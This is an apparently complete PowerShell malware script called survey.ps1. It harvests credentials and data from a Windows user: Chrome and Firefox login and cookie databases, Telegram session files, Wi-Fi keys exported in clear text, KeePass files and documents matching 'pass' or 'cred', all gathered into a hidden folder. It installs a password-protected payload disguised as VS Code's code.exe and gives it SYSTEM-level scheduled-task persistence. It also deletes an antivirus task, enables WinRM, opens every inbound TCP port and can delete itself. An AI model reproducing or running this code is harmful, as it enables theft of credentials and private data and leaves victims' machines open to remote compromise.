$Go = "True"  # Go or Nogo
$CalledFrom = $MyInvocation.MyCommand.Definition.TrimEnd("\survey.ps1")
"Called From $CalledFrom"

Function Get-UserInfo{
        $DomainUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $UserName = $DomainUser.split('\')[-1]
        $Username | out-file -FilePath "$CalledFrom\Results\System\Username.txt" 
        
    }
 
Function Interesting-Files{
    $DomainUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $UserName = $DomainUser.split('\')[-1]
    $AllInterestingFiles = Get-ChildItem -Path "$Env:systemdrive\Users\$UserName\" -Recurse -Include "*.txt","*.pdf","*.docx","*.doc","*.xls","*.xlsx","*.ppt","*pass*","*cred*","*.kdbx" -ErrorAction SilentlyContinue
    foreach ($file in $AllInterestingFiles) { 
        write-host $file
        copy-item "$file" -Destination "$calledfrom\Results\Files\$($file.Name).$($a)" -force
        $a++
        }
       
}

Function Get-SysInfo{
    #Grab the Windows Version and arch
    $OSVersion = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $OSArch = (Get-WmiObject -class win32_operatingsystem).OSArchitecture

    if($OSArch -eq '64-bit')
    {
        $registeredAppsx64 = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Sort-Object DisplayName
        $registeredAppsx86 = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Sort-Object DisplayName
        $registeredAppsx64 | Where-Object {$_.DisplayName -ne ' '} | Select-Object DisplayName | Format-Table -AutoSize | Out-File -Filepath "$calledFrom\Results\System\App64.txt"
        $registeredAppsx86 | Where-Object {$_.DisplayName -ne ' '} | Select-Object DisplayName | Format-Table -AutoSize | Out-File -Filepath "$calledfrom\Results\System\App86.txt"
    }
    else
    {
        $registeredAppsx86 =  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Sort-Object DisplayName
        $registeredAppsx86 | Where-Object {$_.DisplayName -ne ' '} | Select-Object DisplayName | Format-Table -AutoSize | Out-File -Filepath "$calledfrom\Results\System\App86.txt"
    }

	#List of AVs that will set nogo
    $ListofAV = "avp" 
    $procs = Get-Process | select ProcessName,id 
    $procs | out-file -Filepath  "$CalledFrom\Results\System\Processes.txt"
    foreach ($proc in $procs){
        if($listofAV -match($proc.ProcessName)){
            $go = "False"
        }

    }


    Get-Service | Select status,DisplayName | Out-File -Filepath $calledFrom\Results\System\services.txt

    Get-WmiObject -class win32_share | Format-Table -AutoSize Name, Path, Description, Status | Out-File -Filepath "$calledfrom\Results\System\shares.txt"

    $AV = Get-WmiObject -namespace root\SecurityCenter2 -class Antivirusproduct 
    if($AV){
        
        $AV.DisplayName + "`n"
        $AVstate = $AV.productState
        $statuscode = "{0:x6}" -f $AVstate
        $wscscanner = $statuscode[2,3]
        $wscuptodate = $statuscode[4,5]
        $statuscode = -join $statuscode
        $avOUT = $av.DisplayName+"`n" + $av.ProductState+"`n" + $wscanner +"`n" + $wscuptodate + "`n" + $statuscode 
        $avOUT | Out-File -Filepath "$calledfrom\Results\System\AV.txt"
       
    }
    
   Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object hotfixID,InstalledOn -First 5 | Out-File -Filepath "$calledfrom\Results\System\updates.txt"
 
}


Function Get-NetInfo{
    Get-WmiObject -class win32_networkadapterconfiguration | select description,macaddress,ipaddress,defaultipgateway,dnsdomain,servicename | Out-File -Append -Filepath "$calledfrom\Results\System\Adapters.txt" 
    getmac.exe | Out-File -Append -Filepath "$calledfrom\Results\System\Adapters.txt" 
}

function Get-Wlan{
    netsh wlan export profile key=clear folder=.\Results\System\ | out-file -Filepath "$calledfrom\Results\System\Wlan.txt"

}
function Get-USB{
    Get-ChildItem HKLM:\SYSTEM\ControlSet001\Enum\USBSTOR | out-file -Filepath "$calledfrom\Results\System\USB.txt"
}

function GetTelegram{
    $DomainUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $UserName = $DomainUser.split('\')[-1]
    $keywords = "map0", "D877*","map1","settings1","*D30"

    $Path = "${Env:systemdrive}\Users\${UserName}\appdata\Roaming\Telegram Desktop\tdata\*"
    if ((Test-Path -Path $Path)) {
        Get-ChildItem -Path $Path -Force -Include $keywords -ea SilentlyContinue  | Foreach-Object {Copy-Item $_ -Destination "$calledfrom\Results\Telegram"}
       }

}
function Get-Chrome {
    $DomainUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $UserName = $DomainUser.split('\')[-1]
    $keywords = "Login Data", "Bookmarks", "Cookies", "History", "Last Tabs", "Preferences", "Top Sites", "Web Data", "Visited Links", "TransportSecurity"

    $Path = "${Env:systemdrive}\Users\${UserName}\AppData\Local\Google\Chrome\User Data\Default\*"
    Write-Verbose $Env:systemdrive
    if ((Test-Path -Path $Path)) {
        Get-ChildItem -Path $Path -Force -Include $keywords -ea SilentlyContinue  | Foreach-Object {Copy-Item $_ -Destination "$calledfrom\Results\Chrome"}
      }
    }

function Get-FireFox {
    $keywords = "places.sqlite", "formhistory.sqlite", "cookies.sqlite", "key4.db", "Cert9.db"
    $DomainUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $UserName = $DomainUser.split('\')[-1]
    $Path = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\"
    if ((Test-Path -Path $Path)) {
        $files = Get-ChildItem -Path "$Path" -recurse -include $keywords -Force -ErrorAction SilentlyContinue
       
        foreach ($f in $files){ 
            copy-item "$f" -Destination "$calledfrom\Results\Firefox\$($f.Name).$($a)" -force
            $a++
        }
    }
}

#unzips  SVChost.7z to $Installpath as code.exe uses password. sets a scheduled task to run it. 
function Install {
    $DomainUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $UserName = $DomainUser.split('\')[-1]
    $InstallPath="$Env:systemdrive\Users\$UserName\appdata\local\Programs\Microsoft VS Code"
    $InstallName = "code.exe"
    #Stop-Process -Name "Pick Processes" -Force
    New-Item -Path "${Env:systemdrive}\Users\${UserName}\appdata\local\Programs\" -name "Microsoft VS Code" -Type "directory" 
    if (Test-Path "$InstallPath") {
        copy-Item "$calledFrom\survey\7za.exe" -destination "$Installpath"
        copy-item "$CalledFrom\survey\SVCHOST.7z" -destination "$InstallPath"
        Start-Process -File "$InstallPath\7za.exe" -argumentlist "x ""$InstallPath\svchost.7z"" ""-o$InstallPath\"" -pABC123 "
        start-sleep -seconds 5
        remove-item "$InstallPath\7za.exe"
        remove-item "$InstallPath\svchost.7z"
    }

    If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) 
    {   
        schtasks /create /tn Net-Connected /tr \`"$installpath\$installname\`" /SC ONEVENT /EC 'Microsoft-Windows-NetworkProfile/Operational' /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /F
        
    }
    If (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) 
    {
        schtasks /Delete /tn smadav /f
        schtasks /create /tn Net-Connected /tr \`"$installpath\$installname\`" /SC ONEVENT /EC 'Microsoft-Windows-NetworkProfile/Operational' /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /F /RU SYSTEM /RL HIGHEST
    }

}

Function Weaken{
    winrm quickconfig
	New-NetFirewallRule -DisplayName "Block Port" -Direction Inbound -LocalPort 1-65535 -Protocol TCP -Action Allow
}

#Removes all files aside from survey results. 
function Remove-Self {
    Remove-Item -Path "$CalledFrom\survey\survey.ps1"
    Remove-Item -Path "$CalledFrom\survey\svchost.7z"
    Remove-Item -Path "$CalledFrom\survey\7za.exe"
    Remove-Item -Path "$CalledFrom\survey"
    Remove-Item -Path "$Calledfrom\runme.bat"

}


if (-not(Test-Path "$calledfrom\results")) {
    New-Item -Path "$calledfrom\" -Name "Results" -ItemType "directory"
    get-item "$calledfrom\Results" | foreach-Object {$_.Attributes ="Hidden" }
    New-Item -Path "$calledfrom\Results\Chrome"  -ItemType "directory"
    New-Item -Path "$calledfrom\Results\Firefox"  -ItemType "directory"
    New-Item -Path "$calledfrom\Results\System"  -ItemType "directory"
    New-Item -Path "$calledfrom\Results\Docs" -ItemType "directory"
    New-Item -Path "$calledfrom\Results\Telegram" -ItemType "directory" 
    New-Item -Path "$calledfrom\Results\Files"  -ItemType "directory"
}

Get-Wlan
Get-SysInfo
Get-NetInfo

if($Go = "True"){
    Install
}
Get-USB
GetTelegram
Get-Chrome
Get-Firefox
Get-UserInfo
#THIS WILL TAKE A WHILE. 
Interesting-Files
#Remove-Self

"Done Done Done"
